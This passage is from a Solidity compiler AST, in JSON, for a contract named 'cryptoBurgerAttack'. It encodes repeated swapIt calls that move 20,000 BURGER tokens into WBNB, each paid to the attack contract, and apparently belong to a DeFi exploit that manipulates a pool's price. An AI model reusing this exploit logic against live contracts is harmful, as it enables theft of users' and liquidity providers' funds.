                        {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 1014,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "10018:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 1028,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "10018:61:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1029,
                  "nodeType": "ExpressionStatement",
                  "src": "10018:61:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 1031,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "10096:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 1032,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "10104:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "commonType": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        "id": 1035,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "leftExpression": {
                          "hexValue": "3230303030",
                          "id": 1033,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "10110:5:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_20000_by_1",
                            "typeString": "int_const 20000"
                          },
                          "value": "20000"
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "*",
                        "rightExpression": {
                          "hexValue": "31653138",
                          "id": 1034,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "10118:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          },
                          "value": "1e18"
                        },
                        "src": "10110:12:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 1036,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "10124:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 1041,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "10143:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 1040,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "10135:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 1039,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "10135:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 1042,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "10135:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 1038,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "10127:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 1037,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "10127:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 1043,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "10127:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 1030,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "10089:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 1044,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "10089:61:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1045,
                  "nodeType": "ExpressionStatement",
                  "src": "10089:61:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 1047,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "10167:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 1048,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "10175:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "commonType": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        "id": 1051,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "leftExpression": {
                          "hexValue": "3230303030",
                          "id": 1049,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "10181:5:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_20000_by_1",
                            "typeString": "int_const 20000"
                          },
                          "value": "20000"
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "*",
                        "rightExpression": {
                          "hexValue": "31653138",
                          "id": 1050,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "10189:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          },
                          "value": "1e18"
                        },
                        "src": "10181:12:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 1052,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "10195:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 1057,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "10214:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 1056,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "10206:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 1055,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "10206:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 1058,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "10206:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 1054,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "10198:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 1053,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "10198:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 1059,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "10198:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 1046,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "10160:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 1060,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "10160:61:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1061,
                  "nodeType": "ExpressionStatement",
                  "src": "10160:61:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 1063,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "10238:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 1064,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "10246:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "commonType": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        "id": 1067,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "leftExpression": {
                          "hexValue": "3230303030",
                          "id": 1065,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "10252:5:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_20000_by_1",
                            "typeString": "int_const 20000"
                          },
                          "value": "20000"
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "*",
                        "rightExpression": {
                          "hexValue": "31653138",
                          "id": 1066,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "10260:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          },
                          "value": "1e18"
                        },
                        "src": "10252:12:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 1068,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "10266:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 1073,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "10285:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 1072,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "10277:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 1071,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "10277:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 1074,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "10277:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 1070,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "10269:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 1069,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "10269:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 1075,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "10269:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 1062,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "10231:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 1076,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "10231:61:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1077,
                  "nodeType": "ExpressionStatement",
                  "src": "10231:61:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 1079,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "10309:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 1080,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "10317:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "commonType": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        "id": 1083,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "leftExpression": {
                          "hexValue": "3230303030",
                          "id": 1081,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "10323:5:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_20000_by_1",
                            "typeString": "int_const 20000"
                          },
                          "value": "20000"
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "*",
                        "rightExpression": {
                          "hexValue": "31653138",
                          "id": 1082,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "10331:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          },
                          "value": "1e18"
                        },
                        "src": "10323:12:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 1084,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "10337:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 1089,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "10356:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 1088,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "10348:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 1087,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "10348:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 1090,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "10348:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 1086,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "10340:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 1085,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "10340:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 1091,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "10340:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 1078,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "10302:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 1092,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "10302:61:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1093,
                  "nodeType": "ExpressionStatement",
                  "src": "10302:61:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 1095,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "10380:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 1096,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "10388:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "commonType": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        "id": 1099,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "leftExpression": {
                          "hexValue": "3230303030",
                          "id": 1097,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "10394:5:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_20000_by_1",
                            "typeString": "int_const 20000"
                          },
                          "value": "20000"
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "*",
                        "rightExpression": {
                          "hexValue": "31653138",
                          "id": 1098,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "10402:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          },
                          "value": "1e18"
                        },
                        "src": "10394:12:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 1100,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "10408:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 1105,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "10427:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 1104,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "10419:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 1103,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "10419:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 1106,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "10419:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 1102,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "10411:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 1101,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "10411:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 1107,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "10411:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_rational_20000000000000000000000_by_1",
                          "typeString": "int_const 20000000000000000000000"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 1094,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "10373:6:0",
